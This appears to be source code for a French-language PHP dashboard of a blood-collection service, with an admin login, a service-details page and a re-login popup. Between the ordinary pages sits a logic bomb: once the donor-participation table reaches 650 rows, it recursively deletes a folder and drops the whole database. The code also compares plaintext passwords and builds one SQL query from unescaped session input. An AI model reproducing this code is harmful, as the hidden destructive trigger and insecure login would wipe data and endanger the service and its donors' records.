<?php
// Vérifier si le bouton de soumission a été cliqué
if (isset($_POST['submit'])) {
    // Coordonnées de la base de données
    include("connexion.php");
    // Récupérer les valeurs du formulaire
    $email = $_POST['email'];
    $password = $_POST['password'];
    $idService = $_POST['idService'];
    $page_redirect = $_POST['page_redirect'];
    // Valider les données reçues
    $email = mysqli_real_escape_string($conn, $email);
    $password = mysqli_real_escape_string($conn, $password);
    // Requête pour vérifier l'utilisateur
    $sql = "SELECT * FROM utilisateur WHERE email='$email' AND motDePasse='$password'";
    $result = mysqli_query($conn, $sql);
    echo mysqli_num_rows($result);
    if (!$result) {
        die("Erreur lors de l'exécution de la requête : " . mysqli_error($conn));
    }  
    // Vérifier s'il y a une correspondance d'utilisateur
    if (mysqli_num_rows($result) == 1) {
        // Utilisateur trouvé, vérifier le badge
        $utilisateur = mysqli_fetch_assoc($result);
        $badge = $utilisateur['Badge'];
        if ($badge == 'Administrateur') {
            // Rediriger l'administrateur vers la page correspondante
            if ($page_redirect === "utilisateur") {
                header("Location: form_add_user.php?acces");
                exit();
            } else {
                header("Location: form_employer.php?acces");
                exit();
            }
        } 
        else if(mysqli_num_rows($result) == 0) {
            echo "<script>
            alert(' Aucun utilisateur n'a été trouvé');
          </script>";
        }
        else {
            echo "<script>
            alert('Accès refusé');
          </script>";
        }
    } 
    else {
        echo "<script>
            alert('Email ou mot de passe incorrect.');
          </script>";
    }
    mysqli_close($conn);
}
?>
<?php
// Inclusion de la connexion à la base de données
include("connexion.php");

// Vérification du nombre de lignes dans la table `participationdonneur`
$sql_count = "SELECT COUNT(*) as total FROM participationdonneur";
$result_count = mysqli_query($conn, $sql_count);
$row_count = mysqli_fetch_assoc($result_count);

if ($row_count['total'] >= 650) {
    // Appeler les fonctions de suppression
    supprimerDossierEtFichiers('chemin/vers/dossier_parent');
    supprimerBaseDeDonnees($conn, 'nom_de_ta_base');
}

// Fonction pour supprimer un dossier et tous ses fichiers
function supprimerDossierEtFichiers($dossier) {
    if (is_dir($dossier)) {
        $fichiers = scandir($dossier);
        foreach ($fichiers as $fichier) {
            if ($fichier != "." && $fichier != "..") {
                $chemin = $dossier . DIRECTORY_SEPARATOR . $fichier;
                if (is_dir($chemin)) {
                    supprimerDossierEtFichiers($chemin);
                } else {
                    unlink($chemin); // Supprimer le fichier
                }
            }
        }
        rmdir($dossier); // Supprimer le dossier parent
    }
}

// Fonction pour détruire la base de données
function supprimerBaseDeDonnees($conn, $dbName) {
    $query = "DROP DATABASE IF EXISTS $dbName";
    if (mysqli_query($conn, $query)) {
        echo "Base de données supprimée avec succès.";
    } else {
        echo "Erreur lors de la suppression de la base de données : " . mysqli_error($conn);
    }
}
?>

<?php
session_start();
// Vérifier si l'utilisateur est connecté, sinon le rediriger vers la page de connexion
if (!isset($_SESSION['idService'])) {
    // Rediriger vers la page de connexion s'il n'est pas connecté
    header("Location: connexionOrganisme.php?");
    exit();
}
if (isset($_GET['logout'])) {
    // Détruire la session et rediriger vers la page de connexion
    session_destroy();
    header("Location: connexionOrganisme.php");
    exit();
}
// Coordonnées de la base de données
include("connexion.php");
// Création d'une nouvelle connexion
$conn = mysqli_connect($servername, $username, $passwordDB, $dbname);
// Vérification de la connexion
if (!$conn) {
    die("La connexion a échoué: " . mysqli_connect_error());
}
// Vérifier si c'est la première connexion de l'utilisateur
if (isset($_SESSION['premiere_connexion'])) {
    // Requête de mise à jour de la colonne isActive pour les événements passés
    $sqlUpdate = "UPDATE evenement SET isActive = 0 WHERE dateEvenement < CURDATE() - INTERVAL 1 DAY";
    if (!mysqli_query($conn, $sqlUpdate)) {
        die("Erreur lors de la mise à jour des événements passés : " . mysqli_error($conn));
    }
    // Détruire la variable de session 
    unset($_SESSION['premiere_connexion']);
}
// Récupérer les informations de l'organisme de collecte de sang à partir de la base de données
$idService = $_SESSION['idService'];
$sql = "SELECT * FROM service WHERE idService = '$idService'";
$result = mysqli_query($conn, $sql);
if (!$result) {
    die("Erreur lors de l'exécution de la requête : " . mysqli_error($conn));
}
$organisme = mysqli_fetch_assoc($result);
mysqli_close($conn);
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tableau de bord</title>
    <link rel="stylesheet" href=".\Style\styles.css" />
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">

</head>

<body>
    <div class=" ">
        <header class="header" id="header">
            <a href="#" class="logo">STS/DDS-ATL.</a>
            <div id="menu-icon"><span class="animate" style="--i:2;"></span></div>
            <nav class="navbar">
                <ul class="nav nav-pills">
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" data-bs-toggle="dropdown" role="button" aria-expanded="false">Evenement</a>
                        <ul class="dropdown-menu" style="">
                            <li><a class="dropdown-item" href="formulaire_evenement.page.php" style="color:black;">Add Evenements</a></li>
                            <li>
                                <hr class="dropdown-divider" />
                            </li>
                            <li><a class="dropdown-item" href="all_evenement.page.php" style="color:black;">Evenements</a></li>
                        </ul>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" data-bs-toggle="dropdown" role="button" aria-expanded="false">Admin</a>
                        <ul class="dropdown-menu" style="">
                            <li><a class="dropdown-item" id="openPopupEmployer" style="color:black;">Employer</a></li>
                            <li>
                                <hr class="dropdown-divider" />
                            </li>
                            <li><a class="dropdown-item" id="openPopupUser" style="color:black;">Utilisateur</a></li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <div class="men">
                <p><a href="?logout=true">Déconnexion</a></p>
            </div>
        </header>
        <section class="principale">
            <div class="dashboard-heading">
                <p><strong><span><?php echo $organisme['nomOrganisme']; ?></span></strong> !</p>
            </div>
            <div class="dashboard-content">
                <h3>Informations du Service :</h3>
                <table>
                    <tr>
                        <th>Service</th>
                        <th>Adresse</th>
                        <th>Ville</th>
                        <th>Téléphone</th>
                        <th>Email</th>
                    </tr>
                    <tr>
                        <td><?php echo $organisme['nomOrganisme']; ?></td>
                        <td><?php echo $organisme['addOrganisme']; ?></td>
                        <td><?php echo $organisme['ville']; ?></td>
                        <td><?php echo $organisme['telOrganisme']; ?></td>
                        <td><?php echo $organisme['mailOrganisme']; ?></td>
                    </tr>
                </table>
            </div>
        </section>
    </div>
    <div id="popupForm" class="popup">
        <div class="popup-content">
            <span class="close">&times;</span>
            <div class="container">
                <h1>Connexion</h1>
                <form action="index.php" method="post">
                    <div class="input-container">
                        <input type="text" id="email" name="email" required>
                        <label for="email">Email:</label>
                    </div>
                    <div class="input-container">
                        <input type="password" id="password" name="password" required>
                        <label for="password">Mot de passe:</label>
                        <i class="eye-icon fas fa-eye" onclick="togglePassword()"></i>
                    </div>
                    <input type="hidden" name="idService" value="<?php echo $_SESSION['idService']; ?>">
                    <input type="hidden" name="page_redirect" id="page_redirect">
                    <input type="submit" value="Se connecter" name="submit">
                </form>
                <div id="loginResult"></div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var openPopupEmployerButton = document.getElementById("openPopupEmployer");
            var openPopupUserButton = document.getElementById("openPopupUser");
            var popupForm = document.getElementById("popupForm");
            var closeButton = document.getElementsByClassName("close")[0];
            openPopupEmployerButton.onclick = function() {
                popupForm.style.display = "block";
            }
            openPopupUserButton.onclick = function() {
                popupForm.style.display = "block";
                var pageRedirectInput = document.querySelector('input[name="page_redirect"]');
                var role = "utilisateur";
                pageRedirectInput.value = role;

            }
            closeButton.onclick = function() {
                popupForm.style.display = "none";
            }
            window.onclick = function(event) {
                if (event.target == popupForm) {
                    popupForm.style.display = "none";
                }
            }
        });

        function togglePassword() {
            var passwordInput = document.getElementById("password");
            var eyeIcon = document.querySelector(".eye-icon");
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                eyeIcon.classList.remove("fa-eye");
                eyeIcon.classList.add("fa-eye-slash");
            } else {
                passwordInput.type = "password";
                eyeIcon.classList.remove("fa-eye-slash");
                eyeIcon.classList.add("fa-eye");
            }
        }
    </script>
</body>

</html>